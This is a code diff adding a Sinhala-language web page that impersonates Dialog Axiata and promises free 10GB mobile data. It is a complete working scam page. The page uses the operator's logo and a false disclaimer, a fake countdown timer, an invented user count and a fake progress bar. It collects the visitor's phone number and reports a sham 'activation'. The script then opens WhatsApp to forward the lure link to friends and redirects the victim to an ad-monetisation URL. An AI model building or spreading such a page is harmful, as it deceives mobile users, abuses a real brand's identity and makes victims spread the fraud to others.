@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dialog නොමිලේ දත්ත ලබාගන්න - 10GB නොමිලේ!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Sinhala:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Noto Sans Sinhala', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #e30045, #6a00f4);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo img {
+            height: 80px;
+        }
+        
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #ffeb3b;
+        }
+        
+        .offer-card {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .offer-card h3 {
+            color: #4caf50;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .offer-card p {
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+        }
+        
+        .error-message {
+            color: #ffeb3b;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: #4caf50;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            background: #388e3c;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        button:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .progress-container {
+            margin: 30px 0;
+        }
+        
+        .progress-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            width: 0;
+            background: #4caf50;
+            border-radius: 5px;
+            transition: width 2s ease-in-out;
+        }
+        
+        .share-section {
+            text-align: center;
+            margin: 30px 0;
+        }
+        
+        .share-btn {
+            background: #25D366;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 20px;
+            border-radius: 8px;
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        
+        .share-btn i {
+            margin-right: 10px;
+            font-size: 20px;
+        }
+        
+        .disclaimer {
+            font-size: 12px;
+            text-align: center;
+            margin-top: 30px;
+            opacity: 0.8;
+        }
+        
+        .countdown {
+            text-align: center;
+            font-size: 14px;
+            margin: 15px 0;
+            color: #ffeb3b;
+        }
+        
+        .user-count {
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .steps {
+            margin: 20px 0;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .step-number {
+            width: 25px;
+            height: 25px;
+            background: #4caf50;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .step-text {
+            flex: 1;
+        }
+        
+        .status-message {
+            text-align: center;
+            margin: 15px 0;
+            font-weight: bold;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.dialog.lk/content/dam/dialog/dialog-logo-new.svg" alt="Dialog Logo">
+        </div>
+        
+        <h1>නොමිලේ දත්ත ලබාගන්න! 10GB දත්ත + සමාජ මාධ්ය නොමිලේ!</h1>
+        
+        <div class="countdown">
+            <i class="fas fa-clock"></i> ඉතිරිව ඇති කාලය: <span id="timer">25:43</span>
+        </div>
+        
+        <div class="user-count">
+            <i class="fas fa-users"></i> අද දින ලබාගත් පරිශීලකයන්: 1,243
+        </div>
+        
+        <div class="offer-card">
+            <h3>Dialog නොමිලේ දත්ත පිරිනැමීම්</h3>
+            <p>Dialog Axiata ඔබගේ ප්‍රියතම ජංගම සේවා සපයන්නා විසින් නොමිලේ දත්ත පිරිනැමීම්:</p>
+            <ul style="margin-top: 10px; padding-left: 20px;">
+                <li>නව පූර්ව ගෙවීම් සම්බන්ධතා: සක්‍රිය කිරීමෙන් පසු 30 දින සඳහා වලංගු නොමිලේ අන්තර්ජාල 10GB ලබා ගන්න.</li>
+                <li>නොමිලේ සමාජ මාධ්‍ය ප්‍රවේශය: Facebook, Instagram සහ අනෙකුත් සමාජ යෙදුම් 30 දින සඳහා අසීමිතව භාවිතා කරන්න.</li>
+            </ul>
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-info">
+                <span>දත්ත ප්‍රමාණය</span>
+                <span id="progress-percent">0%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+        </div>
+        
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-text">ඔබගේ ජංගම දුරකථන අංකය ඇතුලත් කරන්න</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-text">WhatsApp හරහා 5 මිතුරන්ට බෙදාගන්න</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-text">නොමිලේ දත්ත ලබාගන්න!</div>
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <label for="mobile">ඔබගේ ජංගම දුරකථන අංකය (Dialog)</label>
+            <input type="tel" id="mobile" placeholder="07XXXXXXXX" pattern="[0-9]{10}" required>
+            <div class="error-message" id="mobile-error">කරුණාකර වලංගු Dialog ජංගම අංකයක් ඇතුලත් කරන්න!</div>
+        </div>
+        
+        <div class="status-message" id="status-message"></div>
+        
+        <button id="submit-btn" type="button">දත්ත ලබාගන්න</button>
+        
+        <div class="share-section" id="share-section" style="display: none;">
+            <p>ඔබගේ මිතුරන් 5 දෙනෙකුට මෙම ලින්ක් එක බෙදාගැනීමෙන් පසු ඔබට දත්ත ලබාගත හැකිය:</p>
+            <a href="#" class="share-btn" id="whatsapp-share" target="_blank">
+                <i class="fab fa-whatsapp"></i> WhatsApp හරහා බෙදාගන්න
+            </a>
+        </div>
+        
+        <div class="disclaimer">
+            *මෙම සේවාව Dialog Axiata PLC විසින් සපයනු ලැබේ. දත්ත පැකේජය ලබාගැනීම සඳහා ඔබ Dialog ජංගම සේවා සපයන්නාගේ පාරිභෝගිකයෙක් විය යුතුය. පිරිනැමීම් යටපත්වීමට ලක්විය හැකිය.
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elements
+            const mobileInput = document.getElementById('mobile');
+            const mobileError = document.getElementById('mobile-error');
+            const submitBtn = document.getElementById('submit-btn');
+            const shareSection = document.getElementById('share-section');
+            const whatsappShare = document.getElementById('whatsapp-share');
+            const statusMessage = document.getElementById('status-message');
+            const progress = document.getElementById('progress');
+            const progressPercent = document.getElementById('progress-percent');
+            
+            // Animate progress bar
+            let width = 0;
+            const progressInterval = setInterval(function() {
+                if (width >= 87) {
+                    clearInterval(progressInterval);
+                } else {
+                    width++;
+                    progress.style.width = width + '%';
+                    progressPercent.textContent = width + '%';
+                }
+            }, 50);
+            
+            // Countdown timer
+            let minutes = 25;
+            let seconds = 43;
+            
+            const timerInterval = setInterval(function() {
+                if (seconds === 0) {
+                    if (minutes === 0) {
+                        clearInterval(timerInterval);
+                    } else {
+                        minutes--;
+                        seconds = 59;
+                    }
+                } else {
+                    seconds--;
+                }
+                
+                document.getElementById('timer').textContent = 
+                    (minutes < 10 ? '0' + minutes : minutes) + ':' + 
+                    (seconds < 10 ? '0' + seconds : seconds);
+            }, 1000);
+            
+            // Form validation
+            mobileInput.addEventListener('input', function() {
+                if (/^07[0-9]{8}$/.test(mobileInput.value)) {
+                    mobileError.style.display = 'none';
+                    mobileInput.style.border = 'none';
+                } else {
+                    mobileInput.style.border = '2px solid #ffeb3b';
+                }
+            });
+            
+            // Form submission
+            submitBtn.addEventListener('click', function() {
+                const mobileNumber = mobileInput.value;
+                
+                if (!/^07[0-9]{8}$/.test(mobileNumber)) {
+                    mobileError.style.display = 'block';
+                    mobileInput.style.border = '2px solid #ffeb3b';
+                    return;
+                }
+                
+                // Disable button and show processing
+                submitBtn.disabled = true;
+                statusMessage.textContent = 'කරුණාකර රැඳී සිටින්න... ඔබගේ තොරතුරු සකසමින් සිටිනවා';
+                
+                // Simulate data activation process
+                setTimeout(function() {
+                    statusMessage.textContent = 'ඔබගේ දත්ත සක්‍රිය කිරීම සාර්ථකයි!';
+                    
+                    // Show share section
+                    shareSection.style.display = 'block';
+                    
+                    // Scroll to share section
+                    shareSection.scrollIntoView({ behavior: 'smooth' });
+                    
+                    // Set WhatsApp share link
+                    const shareMessage = `මම දැන් Dialog නොමිලේ දත්ත පැකේජයක් ලබාගන්නවා! ඔබත් ලබාගන්න: dialog.vercel.app`;
+                    whatsappShare.href = `https://wa.me/?text=${encodeURIComponent(shareMessage)}`;
+                    
+                    // Open WhatsApp in new tab after short delay
+                    setTimeout(function() {
+                        window.open(whatsappShare.href, '_blank');
+                        
+                        // After WhatsApp opens, redirect to final URL
+                        setTimeout(function() {
+                            statusMessage.textContent = 'ඔබව ප්‍රධාන පිටුවට යොමු කරමින් සිටිනවා...';
+                            window.location.href = 'https://www.profitableratecpm.com/t4hstkjr2y?key=850fd35b33e232c0badfb6e422356238';
+                        }, 3000); // Redirect after 3 seconds
+                    }, 1000); // Open WhatsApp after 1 second
+                }, 2000); // Simulate processing time
+            });
+        });
+    </script>
+</body>
+</html>
